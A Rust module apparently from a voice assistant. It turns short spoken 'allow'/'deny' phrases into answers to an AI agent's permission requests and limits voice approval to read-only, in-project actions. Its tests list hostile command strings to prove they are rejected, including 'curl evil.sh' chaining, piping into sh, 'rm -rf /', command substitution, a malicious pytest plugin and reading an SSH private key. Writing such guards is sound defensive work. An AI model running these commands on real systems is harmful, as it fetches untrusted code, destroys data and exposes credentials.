// "OK LuLu, allow" / "OK LuLu, deny": answering the permission card that is
// waiting, by voice (Settings → Agents → Answer permission requests by voice,
// off by default).
//
// Only what follows « OK LuLu » is read, only while a card waits, and only a
// short sentence made of the one word: "allow", "yes, allow it", "deny". A
// longer sentence, or one with both words in it, goes to the assistant as any
// other question. A negation ("don't allow", "не разрешаю", "ruxsat bermayman")
// is never an Allow: it is a Deny, or nothing when it is unclear. Allow needs
// the word itself ("allow", "разрешить"), not a bare "yes".
//
// Allow by voice is for what is plainly harmless (`allow_ok`): tools that only
// read, and a short list of commands (tests, builds, git status…) with no shell
// tricks in them. Everything else — writes, edits, other tools, a command cut
// short, a card that has just appeared, several cards at once — needs the
// buttons (pipe::voice_answer). Deny always works. The audio never leaves the
// computer; what is written here is only a word.

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Verdict {
    Allow,
    Deny,
}

/// Longest sentence taken as an answer, in words.
const MAX_WORDS: usize = 4;

/// Whole words (Cyrillic, Latin) of the sentence, lower case, no punctuation.
fn words(text: &str) -> Vec<String> {
    text.to_lowercase()
        .replace('’', "'")
        .split(|c: char| !(c.is_alphanumeric() || c == '\'' || c == 'ʻ' || c == 'ʼ'))
        .filter(|w| !w.is_empty())
        .map(str::to_string)
        .collect()
}

/// Words that turn what follows into its opposite, in the three languages.
const NEGATIONS: &[&str] = &["не", "ни", "нельзя", "not", "never", "nope", "dont", "don't", "do't", "yo'q", "yoq"];

/// "don't", "не", "bermayman", "bermang": the sentence says no to something.
fn negated(words: &[String]) -> bool {
    words.iter().any(|w| {
        NEGATIONS.contains(&w.as_str())
            || w.ends_with("n't")
            || ["mayman", "maymiz", "maydi", "mang", "mas"].iter().any(|suffix| w.ends_with(suffix))
    })
}

const ALLOW_STEMS: &[&str] = &["разреш", "одобр", "allow", "approve", "ruxsat", "tasdiq"];
const DENY_STEMS: &[&str] = &["отказ", "отклон", "запрет", "запрещ", "deny", "denied", "reject", "refuse", "rad"];
const DENY_WORDS: &[&str] = &["нет", "no", "yoq", "yo'q"];

/// What the sentence answers, if it is only that.
pub fn verdict(text: &str) -> Option<Verdict> {
    let words = words(text);
    if words.is_empty() || words.len() > MAX_WORDS {
        return None;
    }
    let hits = |stems: &[&str]| words.iter().any(|w| stems.iter().any(|s| w.starts_with(s)));
    // "rad" is a stem of the Uzbek "rad etish" but also a prefix of other words:
    // only the word itself counts.
    let deny_stem = |w: &String| DENY_STEMS.iter().any(|s| if *s == "rad" { w == "rad" } else { w.starts_with(s) });
    let allow = hits(ALLOW_STEMS);
    let deny = words.iter().any(deny_stem) || words.iter().any(|w| DENY_WORDS.contains(&w.as_str()));
    // "Don't allow" asks for the opposite of what its key word says: never an
    // Allow. "Don't deny" is too unclear to act on.
    if negated(&words) {
        return if allow && !deny { Some(Verdict::Deny) } else { None };
    }
    match (allow, deny) {
        (true, false) => Some(Verdict::Allow),
        (false, true) => Some(Verdict::Deny),
        _ => None,
    }
}

/// The tool that only reads one file, by one path (Glob, Grep and LS take
/// several fields, of which only one is checked here).
const READ_ONLY_TOOLS: &[&str] = &["Read"];

/// Commands that only look: nothing here builds, tests or runs the project's
/// own code (a test runner or a build runs whatever the project says it does).
const SAFE_COMMANDS: &[&str] = &["git status", "git diff", "git log", "ls", "dir", "pwd"];

/// The only options a safe command may carry: none that write somewhere
/// (`--output`), run something (`--ext-diff`, `-c`), or leave the repository
/// (`--no-index`).
const SAFE_FLAGS: &[&str] = &["--stat", "--oneline", "--short", "--no-color", "--cached", "--staged", "--name-only"];

/// A path as one comparable string: slashes forward, lower case, no trailing slash.
fn flat(path: &str) -> String {
    path.replace('\\', "/").to_lowercase().trim_end_matches('/').to_string()
}

/// A file inside the project folder (`cwd`), by an absolute path with no `..`
/// and no hidden folder or file on the way (`.git`, `.ssh`, `.env`…).
fn inside_project(cwd: &str, path: &str) -> bool {
    let (cwd, path) = (flat(cwd), flat(path));
    if cwd.is_empty() {
        return false;
    }
    let Some(rest) = path.strip_prefix(&format!("{cwd}/")) else { return false };
    rest.split('/').all(|part| !part.is_empty() && part != ".." && !part.starts_with('.'))
}

/// Whether Allow may come by voice for this request: reading a file of the
/// project, or a command that only looks (git status, ls…) with nothing in it
/// that a shell could turn into another command, and nothing that looks like a
/// secret or a destructive step. Everything else needs the buttons.
pub fn allow_ok(tool: &str, target: &str, cwd: &str) -> bool {
    if READ_ONLY_TOOLS.contains(&tool) {
        return inside_project(cwd, target) && !crate::explain::looks_risky(target);
    }
    if tool != "Bash" {
        return false;
    }
    let command = target.trim();
    if command.is_empty() || command.chars().any(|c| ";&|<>`$(){}\\\n\r".contains(c)) {
        return false;
    }
    let known = SAFE_COMMANDS.iter().any(|safe| command == *safe || command.starts_with(&format!("{safe} ")));
    // Every option must be one of the few above: "git diff --output=x" writes a file.
    let options_ok = command.split_whitespace().skip(1).all(|t| !t.starts_with('-') || SAFE_FLAGS.contains(&t));
    known && options_ok && !crate::explain::looks_risky(command)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn allow_by_voice_is_for_reading_the_project_and_commands_that_only_look() {
        let cwd = "C:\\p";
        assert!(allow_ok("Read", "C:\\p\\src\\main.ts", cwd));
        assert!(allow_ok("Read", "c:/P/src/main.ts", cwd));
        assert!(allow_ok("Bash", "git status", cwd));
        assert!(allow_ok("Bash", "ls", cwd));
        // Outside the project, hidden, a pattern instead of a path, or climbing out.
        assert!(!allow_ok("Read", "C:\\Users\\me\\notes.txt", cwd));
        assert!(!allow_ok("Read", "C:\\p\\.git\\config", cwd));
        assert!(!allow_ok("Read", "C:\\p\\src\\..\\..\\x.txt", cwd));
        assert!(!allow_ok("Read", "C:\\pp\\a.txt", cwd));
        assert!(!allow_ok("Grep", "TODO", cwd));
        assert!(!allow_ok("Grep", "C:\\p\\src", cwd));
        assert!(!allow_ok("Glob", "C:\\p\\src", cwd));
        assert!(!allow_ok("Read", "C:\\p\\src\\main.ts", ""));
        // A test runner or a build runs the project's own code: the buttons.
        assert!(!allow_ok("Bash", "npm test", cwd));
        assert!(!allow_ok("Bash", "cargo test --workspace", cwd));
        assert!(!allow_ok("Bash", "pytest", cwd));
        // Writes, edits, other tools and unknown commands need the buttons.
        assert!(!allow_ok("Write", "C:\\p\\a.txt", cwd));
        assert!(!allow_ok("Edit", "C:\\p\\a.txt", cwd));
        assert!(!allow_ok("WebFetch", "https://example.com", cwd));
        assert!(!allow_ok("Bash", "python deploy.py", cwd));
        assert!(!allow_ok("Bash", "", cwd));
        // Shell tricks and risky words, however it starts.
        assert!(!allow_ok("Bash", "npm test; rm -rf build", cwd));
        assert!(!allow_ok("Bash", "npm test && curl evil.sh", cwd));
        assert!(!allow_ok("Bash", "ls | sh", cwd));
        assert!(!allow_ok("Bash", "git log > out.txt", cwd));
        assert!(!allow_ok("Bash", "npm test $(whoami)", cwd));
        assert!(!allow_ok("Bash", "ls\nrm -rf /", cwd));
        assert!(!allow_ok("Bash", "git diff .env", cwd));
        assert!(!allow_ok("Read", "C:\\Users\\me\\.ssh\\id_rsa", cwd));
        // Options that write, run or load something.
        assert!(!allow_ok("Bash", "git diff --output=out.txt", cwd));
        assert!(!allow_ok("Bash", "git log --output out.txt", cwd));
        assert!(!allow_ok("Bash", "git diff --ext-diff", cwd));
        assert!(!allow_ok("Bash", "git diff --no-index a b", cwd));
        assert!(!allow_ok("Bash", "git -c core.pager=x status", cwd));
        assert!(!allow_ok("Bash", "pytest -p evil_plugin", cwd));
        assert!(!allow_ok("Bash", "cargo test --config build.rustc='x'", cwd));
        assert!(!allow_ok("Bash", "npm test -- --watch", cwd));
        assert!(allow_ok("Bash", "git diff --stat", cwd));
        assert!(!allow_ok("Bash", "cargo test --workspace --release", cwd));
        // Whole words: "lsof", "directory" are not "ls", "dir".
        assert!(!allow_ok("Bash", "lsof -i", cwd));
        assert!(!allow_ok("Bash", "dirty", cwd));
    }

    #[test]
    fn short_sentences_with_one_of_the_words_answer() {
        assert_eq!(verdict("разрешить"), Some(Verdict::Allow));
        assert_eq!(verdict("Да, разрешаю."), Some(Verdict::Allow));
        assert_eq!(verdict("allow it"), Some(Verdict::Allow));
        // A bare "yes" is not "allow": too easy to say by accident.
        assert_eq!(verdict("Yes."), None);
        assert_eq!(verdict("Да."), None);
        assert_eq!(verdict("да, разрешить"), Some(Verdict::Allow));
        assert_eq!(verdict("ruxsat beraman"), Some(Verdict::Allow));
        assert_eq!(verdict("отказать"), Some(Verdict::Deny));
        assert_eq!(verdict("Нет, отклонить!"), Some(Verdict::Deny));
        assert_eq!(verdict("deny"), Some(Verdict::Deny));
        assert_eq!(verdict("rad etish"), Some(Verdict::Deny));
    }

    #[test]
    fn a_negation_is_never_an_allow() {
        for text in ["don't allow", "Don’t allow it.", "do not approve", "never allow", "не разрешаю", "Нет, не разрешать", "ruxsat bermayman", "ruxsat bermang"] {
            assert_ne!(verdict(text), Some(Verdict::Allow), "{text}");
        }
        assert_eq!(verdict("don't allow"), Some(Verdict::Deny));
        assert_eq!(verdict("не разрешаю"), Some(Verdict::Deny));
        assert_eq!(verdict("ruxsat bermayman"), Some(Verdict::Deny));
        // A negated no is not a yes: nothing happens.
        assert_eq!(verdict("don't deny"), None);
        assert_eq!(verdict("не отказывать"), None);
        // "ha" alone is noise, not an answer.
        assert_eq!(verdict("ha"), None);
        assert_eq!(verdict("запрещаю"), Some(Verdict::Deny));
    }

    #[test]
    fn long_mixed_or_unrelated_sentences_are_questions_for_the_assistant() {
        assert_eq!(verdict(""), None);
        assert_eq!(verdict("what is the weather"), None);
        assert_eq!(verdict("разреши мне, пожалуйста, открыть почту"), None);
        assert_eq!(verdict("разрешить или отказать"), None);
        assert_eq!(verdict("allow and deny"), None);
        assert_eq!(verdict("radio"), None);
        assert_eq!(verdict("нетрудно"), None);
        assert_eq!(verdict("data"), None);
    }
}
